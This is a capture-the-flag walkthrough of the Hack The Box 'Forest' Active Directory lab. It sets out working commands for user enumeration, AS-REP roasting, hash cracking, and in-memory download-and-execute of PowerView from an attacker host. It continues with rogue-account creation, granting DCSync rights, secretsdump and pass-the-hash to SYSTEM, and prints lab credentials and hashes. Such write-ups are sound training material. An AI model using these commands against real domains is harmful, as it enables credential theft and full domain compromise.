# Hack The Box - Forest (Active Directory)

## Machine Information

| Item        | Value                                                                                      |
| ----------- | ------------------------------------------------------------------------------------------ |
| Machine     | Forest                                                                                     |
| Platform    | Hack The Box                                                                               |
| Difficulty  | Easy                                                                                       |
| OS          | Windows                                                                                    |
| Attack Path | Active Directory Enumeration → AS-REP Roasting → BloodHound Abuse → DCSync → Administrator |

---

# Enumeration

## Nmap Scan

Start with a full TCP scan to identify open services.

```bash
nmap -sV -sC -A -T5 -p- -Pn 10.129.154.248
```
<img width="1163" height="740" alt="image" src="https://github.com/user-attachments/assets/f01b8a0b-a3ed-4849-bc73-7668d2c7e721" />

### Key Findings

| Port | Service                  |
| ---- | ------------------------ |
| 53   | DNS                      |
| 88   | Kerberos                 |
| 135  | MSRPC                    |
| 139  | NetBIOS                  |
| 389  | LDAP                     |
| 445  | SMB                      |
| 464  | Kerberos Password Change |
| 593  | RPC over HTTP            |
| 636  | LDAPS                    |
| 3268 | Global Catalog           |
| 3269 | Global Catalog SSL       |
| 5985 | WinRM                    |

The machine is clearly an Active Directory Domain Controller.

---

# Host Resolution

Add the target hostname to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```
<img width="659" height="164" alt="image" src="https://github.com/user-attachments/assets/a5471138-b2b5-4d42-950a-df7ef31993b7" />

Add:

```text
10.129.154.248 forest.htb.local htb.local
```

---

# User Enumeration

## Kerbrute User Discovery

Enumerate valid domain users.

```bash
kerbrute userenum \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
--dc 10.129.154.248 \
-d htb.local \
-t 100
```
<img width="810" height="341" alt="image" src="https://github.com/user-attachments/assets/846d2599-0e2e-41ac-9538-3028e9e591c2" />

Several valid usernames are discovered.

---

## RPC Enumeration

Connect anonymously and enumerate domain users.

```bash
rpcclient 10.129.154.248 -U '' -N
```
<img width="429" height="58" alt="image" src="https://github.com/user-attachments/assets/cd21c578-4223-4258-af0c-df59f6e33f5c" />

Inside the shell:

```bash
enumdomusers
```

Create a user list from the discovered usernames.

Example:

```text
Administrator
andy
svc-alfresco
sebastien
lucinda
...
```

Save as:

```bash
users.txt
```

Verify usernames:

```bash
kerbrute userenum \
--dc 10.129.154.248 \
-d htb.local \
users.txt
```
<img width="1717" height="446" alt="image" src="https://github.com/user-attachments/assets/30c5c274-e2d0-4b4a-beb6-1092093a9504" />

---

# AS-REP Roasting

Request AS-REP hashes for users without Kerberos pre-authentication.

```bash
impacket-GetNPUsers \
htb.local/ \
-dc-ip 10.129.154.248 \
-usersfile users.txt
```
<img width="1397" height="65" alt="image" src="https://github.com/user-attachments/assets/cf0b8d44-db98-4eda-af48-d24dac3bf9db" />

A vulnerable account is identified:

```text
svc-alfresco
```

Save the hash:

```bash
hash.txt
```

---

# Password Cracking

Crack the AS-REP hash using Hashcat.

```bash
hashcat -m 18200 hash.txt \
/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco:s3rvice
```
<img width="1255" height="275" alt="image" src="https://github.com/user-attachments/assets/bead2dca-c4bc-4c1c-9ddd-da7a8f5fbff4" />

---

# Initial Access

## Verify WinRM

Check if WinRM is available.

```bash
crackmapexec winrm \
10.129.154.248 \
-u svc-alfresco \
-p s3rvice
```
<img width="1340" height="169" alt="image" src="https://github.com/user-attachments/assets/11b5bd64-6e40-4a1c-984b-d7f9399427ac" />

Successful authentication confirms remote access.

<img width="1703" height="249" alt="image" src="https://github.com/user-attachments/assets/c2a8551c-1a44-4dd0-b513-b74e2164e551" />

---

## Evil-WinRM

Gain a shell.

```bash
evil-winrm \
-i 10.129.154.248 \
-u svc-alfresco \
-p s3rvice
```
<img width="1101" height="297" alt="image" src="https://github.com/user-attachments/assets/1b5f2387-d9bc-481a-b681-aa9ab5a4b065" />

---

# User Flag

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```
<img width="691" height="635" alt="image" src="https://github.com/user-attachments/assets/b6c81099-21e4-45c7-9a3b-df11f8776d93" />

---

# BloodHound Enumeration

## Collect Domain Data

From the attack machine:

```bash
bloodhound-python \
-u svc-alfresco \
-p s3rvice \
-ns 10.129.154.248 \
-d htb.local \
-c All
```
<img width="1480" height="172" alt="image" src="https://github.com/user-attachments/assets/26243fbb-0cae-4564-ae60-db628b85a0f9" />

Import the generated ZIP file into BloodHound.

---

## BloodHound Analysis

BloodHound reveals that the account has a path to privilege escalation through:

```text
Account Operators
↓
Exchange Windows Permissions
↓
DCSync Rights
↓
Domain Admin Equivalent
```

---

# Privilege Escalation

## Upload PowerShell Tools

Host PowerView locally:

```bash
python3 -m http.server 8000
```

Download inside the WinRM session:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/PowerView.ps1')
```
<img width="1333" height="439" alt="image" src="https://github.com/user-attachments/assets/854d0ccc-86bf-49cb-acbf-6e8e82345e5e" />

---

## Create New User

Create a controlled user account.

```powershell
net user hacked Hacked123 /add
```
<img width="998" height="70" alt="image" src="https://github.com/user-attachments/assets/1c29afd9-eced-41d2-a6d0-a0e98f8a8c96" />

Add the user to Account Operators.

```powershell
net localgroup "Account Operators" hacked /add
```
<img width="1002" height="507" alt="image" src="https://github.com/user-attachments/assets/710c1d26-8f40-42fc-82cc-39f2e5e0902f" />

<img width="1056" height="533" alt="image" src="https://github.com/user-attachments/assets/b8b5ee6e-7ebd-47d1-8b3f-2420a277afac" />

<img width="1634" height="320" alt="image" src="https://github.com/user-attachments/assets/112750f6-3e08-4ce2-addf-d94e601537a3" />



---

## Add User to Exchange Windows Permissions

```powershell
Add-ADGroupMember `
-Identity "Exchange Windows Permissions" `
-Members "hacked"
```
<img width="1056" height="533" alt="image" src="https://github.com/user-attachments/assets/f8289645-ab3d-484e-994d-c59cb135ba04" />

Verify membership:

```powershell
Get-ADGroupMember "Exchange Windows Permissions"
```
<img width="1056" height="533" alt="image" src="https://github.com/user-attachments/assets/76b53f7b-0664-4d17-87f6-dd259b27f32e" />

---

# Grant DCSync Rights

Create credentials:

```powershell
$SecPassword = ConvertTo-SecureString `
'Hacked123' `
-AsPlainText `
-Force

$Cred = New-Object `
System.Management.Automation.PSCredential(
'htb.local\hacked',
$SecPassword
)
```
<img width="1634" height="320" alt="image" src="https://github.com/user-attachments/assets/d88cf74a-0006-4338-8443-88e7c167ae8e" />

Grant DCSync rights:

```powershell
Add-DomainObjectAcl `
-Credential $Cred `
-TargetIdentity "DC=htb,DC=local" `
-PrincipalIdentity hacked `
-Rights DCSync
```
<img width="1483" height="195" alt="image" src="https://github.com/user-attachments/assets/59a5636f-1773-40da-8ce5-157e8f9fe395" />

---

# DCSync Attack

Dump domain secrets.

```bash
impacket-secretsdump \
-dc-ip 10.129.154.248 \
'htb.local/hacked@10.129.154.248'
```
<img width="948" height="171" alt="image" src="https://github.com/user-attachments/assets/bb88d2b8-504b-4c7e-8fe3-a6abf897cf6d" />

Administrator NTLM hash is recovered.

Example:

```text
Administrator:
aad3b435b51404eeaad3b435b51404ee:
32693b11e6aa90eb43d32c72a07ceea6
```
<img width="1307" height="102" alt="image" src="https://github.com/user-attachments/assets/289c5099-3d53-4837-903d-3a7b2dfd652a" />

---

# Pass-the-Hash

Use the Administrator hash to obtain SYSTEM access.

```bash
impacket-psexec \
-hashes \
aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 \
administrator@10.129.154.248
```

Successful shell:

```text
NT AUTHORITY\SYSTEM
```

---

# Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```
<img width="910" height="423" alt="image" src="https://github.com/user-attachments/assets/c1175d2c-2516-4949-b9f5-de1da73669a2" />

---

# Attack Path Summary

```text
Nmap Enumeration
        ↓
Kerbrute User Enumeration
        ↓
RPC User Discovery
        ↓
AS-REP Roasting
        ↓
Crack svc-alfresco Password
        ↓
WinRM Access
        ↓
BloodHound Enumeration
        ↓
Account Operators Abuse
        ↓
Exchange Windows Permissions
        ↓
Grant DCSync Rights
        ↓
SecretsDump
        ↓
Administrator Hash
        ↓
Pass-the-Hash
        ↓
SYSTEM Shell
```

# Lessons Learned

* Kerberos pre-authentication misconfigurations can expose credentials through AS-REP roasting.
* BloodHound is invaluable for identifying AD privilege escalation paths.
* Membership in Exchange-related groups can often lead to domain compromise.
* DCSync permissions effectively provide Domain Admin-level access.
* Pass-the-Hash remains a powerful post-exploitation technique in Active Directory environments.

---

**Machine Owned Successfully**
